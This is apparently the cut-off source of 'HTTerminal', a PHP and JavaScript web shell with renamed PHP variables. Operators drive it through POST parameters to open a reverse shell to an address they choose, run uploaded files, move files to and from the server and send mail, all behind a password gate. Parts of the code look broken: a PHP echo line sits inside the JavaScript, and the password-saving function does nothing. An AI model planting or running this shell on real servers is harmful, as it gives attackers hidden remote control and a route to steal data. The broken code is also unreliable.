HashMD5('anti-lfi'); $sp295938 = '.CLast.' . HashMD5('anti-lfi'); $sp83a6f0 = '.mode.' . HashMD5('anti-lfi'); $spc44712 = ''; $sp5060d2 = '.ccd.' . HashMD5('anti-lfi'); if ($sp81349f == 'windows') { $sp64801f = 'results.' . HashMD5('anti-lfi'); $sp2811ed = 'error.' . HashMD5('anti-lfi'); } return true; } function HashMD5($sp32e067) { global $sp70904c; $sp6f4994 = md5($sp32e067 . $sp70904c); return $sp6f4994; } function HashSHA256($sp32e067) { global $sp70904c; $sp6f4994 = hash('sha256', $sp32e067 . $sp70904c); return $sp6f4994; } function SavePasswordHash($sp3796e1) { if (IsSessionExistsAndIsValid()) { global $sp47d1cb; } } function LoadPasswordHash() { global $sp47d1cb; if (!file_exists($sp47d1cb)) { return false; } else { return file_get_contents($sp47d1cb); } } function Logout() { global $sp295938; if (IsSessionExistsAndIsValid()) { session_destroy(); session_unset(); session_write_close(); touch($sp295938, 100); $sp32e067 = 'LoggedOut'; die($sp32e067); } else { header('Content-Type: text/error; charset=UTF-8'); die('Login'); } } function Login() { if (IsSessionExistsAndIsValid()) { CheckCSRF_Token(); if (isset($_POST['pass']) && isset($_POST['setpass'])) { $sp83677c = $_POST['pass']; if ($sp83677c != '') { SavePasswordHash($sp83677c); $sp32e067 = 'NewPasswordSet'; die($sp32e067); } else { $sp32e067 = 'PasswordMustNotBeEmpty'; header('Content-Type: text/error; charset=UTF-8'); die($sp32e067); } } if (!LoadPasswordHash()) { $sp32e067 = 'SetPassword'; header('Content-Type: text/error; charset=UTF-8'); die($sp32e067); } } else { if (!LoadPasswordHash()) { StartSession(); return; } if (isset($_POST['pass'])) { $sp83677c = $_POST['pass']; if (HashSHA256($sp83677c) == LoadPasswordHash()) { StartSession(); } else { header('Content-Type: text/error; charset=UTF-8'); die('WrongPassword'); } } else { header('Content-Type: text/error; charset=UTF-8'); die('PasswordParameterNeeded'); } } } function PreStartShell() { $spf63f61 = ''; $sp2d79fe = ''; $sp9dace2 = ''; if ($_POST['s'] != 'local') { $spf63f61 = $_POST['s']; if (isset($_POST['p'])) { $sp2d79fe = $_POST['p']; } $sp9dace2 = 'socket'; if (isset($_POST['ssl'])) { $sp9dace2 = 'ssl'; } $spfe16e8 = 'php ' . __FILE__ . " {$sp9dace2} {$spf63f61} {$sp2d79fe}  >/dev/null &"; } else { $sp9dace2 = 'local'; $spfe16e8 = 'php ' . __FILE__ . " {$sp9dace2}  >/dev/null &"; } SetDefaultShellMode(false); global $spc44712; if ($spc44712 == 'proc_open') { if ($sp81349f == 'unix-linux-mac') { SysExec($spfe16e8, false); } else { StartShell($sp9dace2, $spf63f61, $sp2d79fe); } } else { if ($sp9dace2 == 'local') { LogTXT('Warning:Shell mode is command_only.
You can\'t get run-time outputs or read stderr
Just send your command to execute them
or use command "rv" to get a reverse shell

'); } else { StartShell($sp9dace2, $spf63f61, $sp2d79fe); } } die; } set_error_handler('ErrorHandler'); if (PHP_SAPI != 'cli') { header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0'); header('Cache-Control: post-check=0, pre-check=0', false); header('Pragma: no-cache'); } else { $sp9dace2 = $sp547954[1]; if ($sp547954[2]) { $spf63f61 = $sp547954[2]; } if ($sp547954[3]) { $sp2d79fe = $sp547954[3]; } if (file_exists($spff2c9e)) { unlink($spff2c9e); } StartShell($sp9dace2, $spf63f61, $sp2d79fe); die; } if (isset($_POST['s'])) { Login(); session_write_close(); PreStartShell(); die; } elseif (isset($_POST['r'])) { Login(); session_write_close(); ReadTXT(); if (file_exists($sp700382)) { @unlink($sp700382); } die; } elseif (isset($_POST['c'])) { Login(); session_write_close(); SendSTDIN(); die; } elseif (isset($_POST['k'])) { Login(); session_write_close(); SendSIGKILL(); die; } elseif (isset($_POST['d'])) { Login(); session_write_close(); DownloadFile(); die; } elseif (isset($_POST['p'])) { Login(); session_write_close(); Upload(); die; } elseif (isset($_POST['from'])) { Login(); session_write_close(); SendMail(); die; } elseif (isset($_FILES['file'])) { Login(); session_write_close(); pexec(); die; } elseif (isset($_POST['l'])) { Login(); Logout(); @session_write_close(); die; } elseif (isset($_POST['cm'])) { Login(); session_write_close(); ChangeShellMode(); die; } elseif (isset($_POST['ccd'])) { Login(); session_write_close(); $sp323b44 = CCD($_POST['ccd']); if ($sp323b44 != '') { LogTXT($sp323b44); } die; } elseif (isset($_POST['cwd'])) { Login(); session_write_close(); $sp323b44 = cwd(); if ($sp323b44 != '') { LogTXT($sp323b44); } die; } ?>
<!DOCTYPE html>
<html>
<head>
<title>HTTerminal</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
</head>

<style>

.terminal{
position: absolute;
left: 1%;
top: 1%;
width:98%;
height:80%;
color: white;
background-color: black;
overflow-x: hidden;
overflow-y: scroll;
font-size:10vw;
}

.buttons{
position: absolute;
/*
width:14.5vw;
*/
height:10%;
box-shadow: 1px 5px 1px gray;
font-family: courier,fixed,swiss,monospace,sans-serif;

/*
font-size:4vh;
font-weight:15vw;
*/

font-size:calc(4.5vh*(100vw/100vh));
font-weight:calc(14.5vw*(100vw/100vh));

background-color:#158eef;
color:#ffffff;
text-align:center;

min-width:14.5%;



/*round button corners*/
border-radius:20%;


}

/*prevent dotted box after button clicking*/
button::-moz-focus-inner { border: 0; }


.inptxt{
position: absolute;
left: 1%;
top: 82%;

width:65%;
height:10%;
font-family: courier,fixed,swiss,monospace,sans-serif;
font-size:5vh;
font-weight:15vw;

background-color:Black;
color:white;

box-shadow: 1px 1px 1px gray;


resize:none;

white-space: pre;
overflow: auto;
}

.sendButton{
width:14.5%;
height:10%;
left: 66.5%;
top: 82%;
background-color:green;
color:white;
}

.UpBtn{
top: 82%;
left: 82%;

min-width:7.25%;
height:5%;
}

.DownBtn{
top: 87%;
left: 82%;

min-width:7.25%;
height:5vh;
}



.uploadButton{

background-color:red;
color:white;


position:absolute
box-shadow: 1px 0.5px 1px gray;


min-width:7.25vw;
top: 73vh;

left:11.5vw;
}




.FileInput{

opacity:0;
position:absolute;
z-index:-1;

}

.BrowseLabel{
position:absolute;
cursor: pointer;
background-color:#e9b96e;
color:black;
text-align:center;

top: 85.5%;
left: 91.75%;


font-family: courier,fixed,swiss,monospace,sans-serif;
font-size:2vh;
font-weight:6vw;

width:7%;


display: block;
white-space: nowrap;
text-overflow: ellipsis;
overflow: hidden;
}

.Downloadtxt{
top: 73vh;
width:21.66vw;

left:26.5vw;
}

</style>
<script type="text/javascript">


var Version=1;
var ProjectPage="https://github.com/0xCoderMan/HTTerminal";
var DonationAddress="1MS34ogcsPj3mSrNJfutUrR1yxC9XTxiyf"

var DonationLink="https://www.blockchain.com/btc/payment_request?address="+DonationAddress+"&message=Thanks for your donation.";
















String.prototype.CrossBrowserstartsWith=function(str){
return (this.indexOf(str)==0);
};


String.prototype.CrossBrowserendsWith=function(str){
return (this.lastIndexOf(str)==this.length-str.length)
};


String.prototype.replaceAll = function(search, replacement) {
    var target = this;
    return target.split(search).join(replacement);
};




String.prototype.trimStartAndEnd =function() {
    var str=this
    str = str.replace(/^\s+/, '');
    for (var i = str.length - 1; i >= 0; i--) {
        if (/\S/.test(str.charAt(i))) {
            str = str.substring(0, i + 1);
            break;
        }
    }
    return str;
}

var HIST;//History Loaded from local storage.This will be used to read from local storage or write to it

var HIST2=[""];//History list containing what is going on run-time period.
//What HIST2 Array looks like: ["WhatIsInTextBoxNow",TheOldsetCommandInHistory,...,TheNewestCommandInHistory]

var HIST_index=0;//HIST_index contains the index of item loaded from HIST2 array to input textbox.We use it to access items from history list HIST2

var TXTCOLOR;//This contains the current color of terminal text color

var BGCOLOR;//This contains the current color of terminal background color

var TXTSIZE;//This contains the size of terminal text

var LocalStorageSupported=false;//Is Local Storage supported or not.Will be changed to "true" if it is supported


var lastoutput="";//Contains last result update from terminal

var ServerCommands=""//Contains commands will be sent to the server

var AutoScroll=true;//Auto scroll terminal if new result is available(value controlled by "src" command)

var AutoUpdate=true//Update results from server automatically or not?

var SaveCommandsToLocalStorage="y"; //Save commands to local storage or not if it is supported?


if(typeof Storage!==void(0)){//Local Storage is supported.Extract settings and History saved on browser
	LocalStorageSupported=true;

	BGCOLOR=localStorage.getItem("BGCOLOR");//terminal backgroundcolor saved to local storage
	TXTCOLOR=localStorage.getItem("TXTCOLOR");//terminal textcolor saved to local storage
    TXTSIZE=localStorage.getItem("TXTSIZE");//terminal text size saved to local storage
	SaveCommandsToLocalStorage=localStorage.getItem("LOCALHIST");
	
	HIST=JSON.parse(localStorage.getItem("HIST"));//extract history saved from local storage to HIST.History is saved in JSON format on local storage so decode JSON format
	
	
	if(!BGCOLOR){BGCOLOR="black";}//If Nothing is saved for color settings and history in local storage,use default colors and empty history
	if(!TXTCOLOR){TXTCOLOR="white";}
	if(!TXTSIZE){TXTSIZE="5vh";}
	if(!HIST){HIST=[];}
	
	if(SaveCommandsToLocalStorage!="y" && SaveCommandsToLocalStorage!="n"){SaveCommandsToLocalStorage="y";}
	
	Array.prototype.push.apply(HIST2,HIST);//Copy Histroy loaded from local storage to History list

}else{//Local Storage not supported.History and settings will not be saved on the browser.Use default settings...

	BGCOLOR="black"//Default colors for terminal:Black background and white text
	TXTCOLOR="white"
	TXTSIZE="5vh";
}


function SaveSettingsAndHist(LocalItem,value){//Function to Save history and settings if local storage is supported else do nothing
	if(LocalStorageSupported){
		if(LocalItem=="HIST"){//If want to save history.encode it into JSON format	
			
			if(SaveCommandsToLocalStorage=="y"){
				value=JSON.stringify(value);
			}else if(value!=[]){//for clearhist command
				return;//Don't save commands to local storage
			}
	
		}
		localStorage.setItem(LocalItem,value);
	}
}

var ServerOuts='';
function clientLogTXT(txt){//Function to print to htterminal console screens

	document.getElementById("terminal").contentWindow.document.getElementById("output").innerHTML+=ServerOuts+txt;
	
}



function PrepareTerminalIframe(){//Function to convert iframe to terminal
	/*
	Html codes of terminal iframe
	div "terminal_back" contains terminal body
	label "input" contains what input textbox "inptxt" contains
	label "cursor" contains Cursor and will blink by BlinkCursor() function
	label "output" contains commands output (result of local commands or result of commands executed on server)
	*/
	var IframeHTML="\
		<html>\
		<style>\
		.bgstyle {\
		color:"+TXTCOLOR+";\
		background-color: "+BGCOLOR+";\
		font-family: courier,fixed,swiss,monospace,sans-serif;\
		font-size:"+TXTSIZE+";\
		font-weight:15vw;\
		opacity: 0.9;\
		}\
		</style>\
		<body style=\"\" oncopy=\"window.parent.document.getElementById(\'inptxt\').focus();\" onkeypress=\"var k=event.key;if(k.length==1){window.parent.document.getElementById(\'inptxt\').value+=k};window.parent.document.getElementById(\'inptxt\').focus();\">\
		<div width=\"100%\" height=\"100%\" class=\"bgstyle\" id=\'terminal_back\'>\
		<label id=\'output\'></label><label id=\'input\'></label><label id=\'cursor\' style=\'background-color: "+TXTCOLOR+";\'>&nbsp;</label>\
		</div>\
		</body>\
		</html>\
		";
	//open iframe document,write Iframe html codes to it,close it
	document.getElementById("terminal").contentWindow.document.open();
	document.getElementById("terminal").contentWindow.document.write(IframeHTML);
	document.getElementById("terminal").contentWindow.document.close();

}








function CheckHTTPS(){//Function to check address is HTTPS or not,warn user if isn't
	if(!document.URL.CrossBrowserstartsWith("https")){//address isn't HTTPS and warn user about it
		var Warning="Warning:use HTTPS protocol to protect your terminal from sniffing attacks!<br><br>"
		clientLogTXT(Warning)
	}
}




function main(){//Function to load settings and call neccessarry function after body was loaded
	PrepareTerminalIframe()//Convert iframe to terminal
	SetColors(BGCOLOR,TXTCOLOR)//Set created terminal text and background color to loaded colors from local storage or default colors
	SetFontSize(TXTSIZE)//Set created terminal text size  to loaded size from local storage or default colors
	ShowHelp()//print Help message to terminal
	CheckHTTPS()//Check address is HTTPS and if isn't warn user about it's dangers

        window.setInterval("BlinkCursor()", 600);//Blink cursor every 600 miliseconds
        window.setInterval("ScrollDownByOutPutUpdating()", 200);//Check and Scroll down iframe every 200 miliseconds
        window.setInterval("Updator()", 3000);//Update terminal every 3000 miliseconds
        document.getElementById('inptxt').focus()//Focus textbox
        
}





function BlinkCursor(){//Function to blick cursor of teminal,we call this function every n miliseconds
	if(document.activeElement!=document.getElementById("inptxt")){//If textbox is not focused,don't blink
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=BGCOLOR;
		return;
	}

	//Blink cursor by changing it color to background/text color of terminal
	var col=document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor
	if(col==TXTCOLOR){
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=BGCOLOR;
	}else{
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=TXTCOLOR;
	}
}






function ScrollDownByOutPutUpdating(){//This functions Scrolls down terminal iframe as it be updated,be called every n miliseconds
	var TextInOutPutLabel=document.getElementById("terminal").contentWindow.document.getElementById("output").innerText
	if(lastoutput!=TextInOutPutLabel){//terminal output is difference of what is comming,means terminal's text is updated and should scroll down the iframe
		if(AutoScroll){
		     document.getElementById("terminal").contentWindow.scrollTo(0,999999);//Scroll down iframe
		     lastoutput=TextInOutPutLabel
		}
	}
}




function inptxtchange(value){
	if(AutoScroll){
	document.getElementById("terminal").contentWindow.scrollTo(0,999999);//Scroll down terminal iframe on textbox text change
    }
	var LinesArray=value.split("\n");//Convert textbox input to an array by splitting newline,Newline at the end of line is similar to pressing Enter at Linux terminal.
	var size=LinesArray.length//Get size of lines array
        var NewValueForTextbox=''
	if(1<size){//Lines array size is more than 1,it means we have at least one line ending with Newline and it's time to execute command(s)



/*
There are two kinds of commands:
1-Custom commands:
Commands that are defined by the programmer of this project(Me ^_^) to perform some usefull acts as setting terminal colors,showing history saved is local storage,uploading files,...

2-OS shell commands:
Commands that be sent to the server to execute and their result be printed in the terminal,For linux they are bash commands.examples:ls -a,whoami,...

We Check all commands entered by the user for Custom or OS shell commands,Execute Custom commands by Javascript or PHP then send OS shell commands to server and wait to get their result
*/

		if(LinesArray[size-1]==""){//All Lines ending with newline.Execute All lines and add them to history

			LinesArray.splice(-1,1);//The last item of line1\nline2\n....lineN\n lines array is null,remove it from array
			for (var n in LinesArray) {//For every Line in the lines array...
                                 //Check if line is not empty and is not depublicate then add it to history list
/*				 if(LinesArray[n].trim()!="" && HIST[HIST.length-1]!=LinesArray[n]){
					  HIST.push(encodeHTML(LinesArray[n]))
				 }
*/
				 CheckCommand(LinesArray[n])//Send command to check is it Custom if not then send it to server
			}


		}else{//The Last Line not ending with Newline.Execute all lines and add them to history except the last line.keep the last line in the textbox



if(document.getElementById('inptxt').selectionStart==document.getElementById('inptxt').value.length){

			var theLastLine=LinesArray[size-1];//Get value of the last line
			NewValueForTextbox=theLastLine//Keep the last line text in textbox
			LinesArray.splice(-1,1);//Delete the last line from array.The last line not being executed


			for (var n in LinesArray) {//For every Line in the lines array...
                                 //Check if line is not empty and is not depublicate then add it to history list
/*				 if(LinesArray[n].trim()!="" && HIST[HIST.length-1]!=LinesArray[n]){
					  HIST.push(encodeHTML(LinesArray[n]))
				 }
*/
			     CheckCommand(LinesArray[n])//Send command to check is it Custom if not then send it to server
			}


}else{

LinesArray=LinesArray.join("")
CheckCommand(LinesArray)
}


		}

		/*
		After Executing Commands:
		Update History
		Make Run-time History empty and then append the real history (HIST) to it
		Save the real history (HIST) to local storage if it is supported
		Set Current History index to 0
		*/
		HIST2=[""];
		Array.prototype.push.apply(HIST2,HIST);
		SaveSettingsAndHist("HIST", HIST);//Update Local Storage History if is supported
		HIST_index=0;
		document.getElementById("inptxt").value=NewValueForTextbox;//Set textbox new value as commands are recieved and are going to be checked




	}//else{// size<=1 means No Newline character found in the string so just nothing to do.We have no commands to execute

	//Update terminal "input" to what is in textbox now
	 UpdateInputLabelByTextbox()
}


function UpdateInputLabelByTextbox(){
document.getElementById("terminal").contentWindow.document.getElementById("input").innerHTML=encodeHTML(document.getElementById("inptxt").value);
}




function DownLoadTextToFile(filename,type,data) {//Function to download data as a file locally
	var blob = new Blob([data],{type:type});//Create a blob,content-type is type(ex. text/plain,text/html,...),pass data to it


    if (window.navigator && window.navigator.msSaveOrOpenBlob) {//On Microsoft browsers_IE & Edge
          window.navigator.msSaveOrOpenBlob(blob, filename);
    } else {//On other browsers
	      var link = document.createElement('a');//Create a link in document
	      link.href = window.URL.createObjectURL(blob);//pass blob values to link
	      link.download = filename;//set filename
	      document.body.appendChild(link);//append link to document's body
	      link.click();//Click the created link to download file
	      document.body.removeChild(link);//Detete created link after clicking it
	
    }

}




function getFileNameByContentDisposition(contentDisposition){//Function to extract filename from content-Disposition HTTP response header.server set's it while asking to download a file

    /*
    What Content-Disposition header looks like:Content-Disposition: attachment; filename="filename.jpg"
    Using regex to extract filename from header
    */
	var regex = /filename[^;=\n]*=(UTF-8(['"]*))?(.*)/;
	var matches = regex.exec(contentDisposition);
	var filename;

	if (matches != null && matches[3]) { 
	      filename = matches[3].replace(/['"]/g, '');
	}

	    return decodeURI(filename);//Decode URL encoded filename extracted and return it
}



echo "[syslog]04\n";
function CheckIsPasswordStrong(password){//Function To check password is strong
	var passwordStrongRegex =new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{6,})");//regex for Strong passwords,contain one upper character,one lower character,one numeric character and be at least 6 characters

	if(!passwordStrongRegex.test(password)){//If password is weak,Warn user about it
		clientLogTXT("Warning:Your password is weak.It should contain one upper character,one lower character,one numeric character and be at least 6 characters<br>")
	}else{
		clientLogTXT("Your password is strong<br>")//If password is strong,print this to terminal
	}

}


function encodeHTML(s) {
/*
prevent xss
https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.231_-_HTML_Escape_Before_Inserting_Untrusted_Data_into_HTML_Element_Content

& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;
/ --> &#x2F;
space --> &nbsp;
\n --> <br>
*/

 return s.replaceAll(/&/g,'&amp;').replaceAll(/</g,'&lt;').replaceAll(/>/g,'&gt;').replaceAll(/"/g,'&quot;').replaceAll(/'/g,'&#x27;').replaceAll(/ /g,'&nbsp;').replace(/\n/g, '<br>');
}


function decodeHTMLEntities(text) {

return text.replace(/[\u00A0-\u9999<>\&]/gim,function(i){return '&#'+i.charCodeAt(0)+';';});

}



function OnFileChoose(){//Function to print name of choosen file for upload
	var x=document.getElementById('file').value;//Get choosen file name
	document.getElementById('filenamelbl').innerText=x;//Set filenamelbl("Choose file to upload" label) value to choosen file name
	clientLogTXT("File "+encodeHTML(x)+" was chosen to upload<br>");//Print choosen file name in terminal
	document.getElementById('inptxt').focus()//focus textbox after choosing file
}



function ValidateAddress(address) {//Function to validate an Ip/domain

ValidIpAddressRegex = new RegExp("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");//Valid ip address regex
ValidHostnameRegex = new RegExp("^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$");//Valid hostname regex
  if (ValidIpAddressRegex.test(address) || ValidHostnameRegex.test(address)) {//Return address/hostname is valid or not  
    return true
  }
  return false
} 



function ProgressUpload(percentage){//Function to print Upload progress in terminal
	if(!document.getElementById('terminal').contentWindow.document.getElementById("upload-progress")){//Check if upload-progress label elemet exists in terminal if not create it       //Create upload-progress label element
		clientLogTXT("<label id='upload-progress'>Upload Progress:0%<br></label>")
	}

	if(percentage==100){//If percentage is 100.delete upload-progress element by setting it's outerHTML to "Upload Progress:100%<br>" and print Operation completed
		document.getElementById('terminal').contentWindow.document.getElementById("upload-progress").outerHTML = "Upload Progress:100%<br>";
		clientLogTXT("Transferring file compeleted<br>")
	}else{//Operation is not completed,Update upload-progress label to percentage
		document.getElementById('terminal').contentWindow.document.getElementById('upload-progress').innerHTML="Upload Progress:"+percentage+"%<br>"

	}
}


function CheckIsEmailAddress(email) {//Function to check an email address is valid or not
 return /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()\.,;\s@\"]+\.{0,1})+[^<>()\.,;:\s@\"]{2,})$/.test(email);//return email address is valid or not
}




function setpass(pass){
    if(pass==""){
        clientLogTXT("password cannot be empty<br>")
        return;
    }
    CheckIsPasswordStrong(pass)
    var params="r=&pass="+encodeURIComponent(pass)+"&setpass=1"
    var MessageArgs=[];
    MessageArgs[0]=pass;
    HTTPCommunicate("setpass",params,MessageArgs)
}




function ReverseShell(address,port,ssl){//Function to ask server for a reverse shell
    var params="s="+encodeURIComponent(address)+"&p="+encodeURIComponent(port)
    if(ssl){params+="&ssl="}
    HTTPCommunicate("rv",params,"");
}




function DownloadFromServer(path){//Function to ask server to download a file from a path on the server
    var MessageArgs=[];
    MessageArgs[0]=path;
    HTTPCommunicate("download",'d=' + encodeURIComponent(path),MessageArgs);
}


function Login(pass){
    var params="r=&pass="+encodeURIComponent(pass)+"&="
    HTTPCommunicate("login",params,"")
}


function Logout(){
    var params="l=";
    HTTPCommunicate("logout",params,"")
}




function SendMail(from,to,replyto,subject,messagefile,cc,bcc,attachmentfile){
    if(from=="" || to=="" || subject=="" || messagefile==""){
        clientLogTXT("Error:from address,to address,Mail subject and message file path cannot be empty<br>");
        return;
    }
    if(!CheckIsEmailAddress(from)){
        clientLogTXT("Error:from email address "+encodeHTML(from)+" is not a valid E-mail address<br>");
        return;
    }
    if(!CheckIsEmailAddress(to)){
        clientLogTXT("Error:to email address "+encodeHTML(to)+" is not a valid E-mail address<br>");
        return;
    }
    
    
    if(replyto!=""){
        if(!CheckIsEmailAddress(replyto)){
            clientLogTXT("Error:Reply-To email address "+encodeHTML(replyto)+" is not a valid E-mail address<br>");
            return;
        }
    }
    
    if(cc!=""){
        var ccArray=cc.split(",");
        ccArray=ccArray.filter(function(str){return /\S/.test(str);});//Remove WhiteSpace elements from array
        for (var n in ccArray) {
            if(!CheckIsEmailAddress(ccArray[n])){
                clientLogTXT("Error:CC email address "+encodeHTML(ccArray[n])+" is not a valid E-mail address<br>");
                return;
            }
            
        }
    }
    
    
    if(bcc!=""){
        var bccArray=bcc.split(",");
        
        bccArray=bccArray.filter(function(str){return /\S/.test(str);});//Remove WhiteSpace elements from array
        for (var n in bccArray) {
            if(!CheckIsEmailAddress(bccArray[n])){
                clientLogTXT("Error:BCC email address "+encodeHTML(bccArray[n])+" is not a valid E-mail address<br>");
                return;
            }
        }
    }
    
    var params="from="+encodeURIComponent(from)+"&to="+encodeURIComponent(to)+"&replyto="+encodeURIComponent(replyto)+"&subject="+encodeURIComponent(subject)+"&messagefile="+encodeURIComponent(messagefile)+"&cc="+encodeURIComponent(cc)+"&bcc="+encodeURIComponent(bcc)+"&attachmentfile="+encodeURIComponent(attachmentfile)
    HTTPCommunicate("sendmail",params,"");
    
}



function SendSTDIN(stdin){//Function to send stdin text to server.it can be a command
    var params='c='+encodeURIComponent(stdin);
    HTTPCommunicate("sendstdin",params,"")
}





function UploadFile(filePathOnServer){
    var formdata = new FormData();
    var file = document.getElementById("file").files[0];
    var sep="<?php  echo DIRECTORY_SEPARATOR; if ($sp81349f == 'windows') { echo DIRECTORY_SEPARATOR; } ?>
";
    if(filePathOnServer==""){
        filePathOnServer="."+sep;
    }
    
    if(filePathOnServer.substr(filePathOnServer.length - 1)!=sep){
        filePathOnServer+=sep;
    }
    
    if(!file){
        clientLogTXT('Error:No file is selected.Click on "Browse your file..." to choose your file for uploading <br>')
        return;
    }
    formdata.append("file",file);
    formdata.append("p",filePathOnServer);
	formdata.append("token",CSRF_token);
    
    var MessageArgs=[];
    MessageArgs[0]=filePathOnServer;
    MessageArgs[1]=file["name"];
    HTTPCommunicate("upload",formdata,MessageArgs)

}






function pexec(){
    var formdata = new FormData();
    var file = document.getElementById("file").files[0];
    if(!file){
        clientLogTXT('Error:No file is selected.Click on "Browse your file..." to choose your file for executing <br>')
        return;
    }
    formdata.append("file",file);
	formdata.append("token",CSRF_token);
    var MessageArgs=[];
    MessageArgs[0]=file["name"];
    HTTPCommunicate("pexec",formdata,MessageArgs)
}





function SigKill(){
    HTTPCommunicate("sigkill",'k=',"")
}





function CheckArgs(CommandArgs,QouteOrDoubleQoute,ReplaceDoubleQoutes){
    if(CommandArgs=="SyntaxError"){
        return "SyntaxError"
    }
    
    var l=CommandArgs.length
    var Si=-1;
    for (var i = 0; i < l; i++) {//Search ' in every item
        
        if(CommandArgs[i].CrossBrowserstartsWith('\'') && CommandArgs[i].CrossBrowserendsWith('\'') ){
            CommandArgs[i]=CommandArgs[i].split("\"").join("<©|")
        }
        
        
        if(CommandArgs[i].CrossBrowserstartsWith(QouteOrDoubleQoute)){
            Si=i
            if(!CommandArgs[i].CrossBrowserendsWith(QouteOrDoubleQoute)){
                
                var Ei=-1;
                for (var i2 = i; i2 < l; i2++){
                    if(CommandArgs[i2].CrossBrowserendsWith(QouteOrDoubleQoute)){Ei=i2;break;}
                    
                }
                if(Ei==-1){return "SyntaxError";break;}
                var part=CommandArgs.slice(Si,Ei+1)
                var part_size=(Ei+1-Si)
                part=part.join(" ")
                part=part.slice(1,part.length-1)
                //alert(part);
                CommandArgs[Si]=part
                CommandArgs.splice(Si+1,Ei-Si)
                l=l-(Ei-Si)
            }
            
        }
    }
    
    
    
    for (var i = 0; i < CommandArgs.length; i++) {//Clean empty items from array
        if (CommandArgs[i].trim() == "") {
            CommandArgs.splice(i,1);
            i--;
        }
    }
    
    for (var i = 0; i < CommandArgs.length; i++) {//Clean ''
        if (CommandArgs[i].CrossBrowserstartsWith(QouteOrDoubleQoute) && CommandArgs[i].CrossBrowserendsWith(QouteOrDoubleQoute)) {
            CommandArgs[i]=CommandArgs[i].slice(1,CommandArgs[i].length-1)
        }
    }
    
    
    
    if(ReplaceDoubleQoutes){
        for (var i = 0; i < CommandArgs.length; i++) {
            CommandArgs[i]=CommandArgs[i].split("<©|").join('"')
        }
        
    }
    return CommandArgs;
    
    
}




function CheckCommand(command){
    //Get first word of command string by splitting by space
    command=command.trimStartAndEnd()
    
    if(command.trim()!="" && HIST[HIST.length-1]!=command){
        HIST.push(command)//Add command to history
    }
    
    var CommandArgs=command.split(" ")
    
    
    
    var l=CommandArgs.length
    
    var CommandName=CommandArgs[0]
    var ArgsLen=CommandArgs.length
    
    if(CommandName.length>1){
        
        
        CommandName=CheckArgs(CheckArgs([CommandName],"'",false),'"',true)[0];
        
        
        
    }
    
    var argv=CheckArgs(CheckArgs(CommandArgs,"'",false),'"',true);
    
    
    
    var argc=argv.length;
    
    
    switch(CommandName){
        case "":
            SendSTDIN("\n")
            break;
            
            
        case "helpme":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            
            ShowHelp()
            break;
            
        case "hist":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

            

            ShowHistory()
            break;
            
        case "clearhist":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

			if(argc==2){
				
			    ClearHIST(argv[1])//remove the nth command from array	
				
			}else{
			
			    ClearHIST("all")// "all" to clear all items from history	
			
			}            

            
            break;
            
            
        case "clearterm":
            document.getElementById("terminal").contentWindow.document.getElementById("output").innerHTML=""
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
           
            break;
            
            
            
        case "license":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            ShowLicense()
            break;
            
            
        case "github":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            window.open(ProjectPage,'_blank');
            break;
            
            
        case "donate":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

            window.open("https://www.blockchain.com/btc/payment_request?address="+DonationAddress+"&message=Thanks for your donation.",'_blank');
            break;
            
            
        case "savehtml":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            var d = new Date();
            var datetime=d.getFullYear()+"_"+d.getDate()+"_"+d.getMonth()+"_"+d.getHours()+"_"+d.getMinutes()+"_"+d.getSeconds()
            DownLoadTextToFile("HTTerminal_"+datetime+".html","text/html",document.getElementById("terminal").contentWindow.document.documentElement.innerHTML)
            break;
            
            
        case "savetxt":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            var d = new Date();
            var datetime=d.getFullYear()+"_"+d.getDate()+"_"+d.getMonth()+"_"+d.getHours()+"_"+d.getMinutes()+"_"+d.getSeconds()
            DownLoadTextToFile("HTTerminal_"+datetime+".txt","text/plain",document.getElementById("terminal").contentWindow.document.documentElement.innerText)
            break;
            
            
        case "login":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

                
                
                
            if(argc==2){
                
                Login(argv[1])
                
            }else if(argc==1){
                
                Login("")
                
                }else{
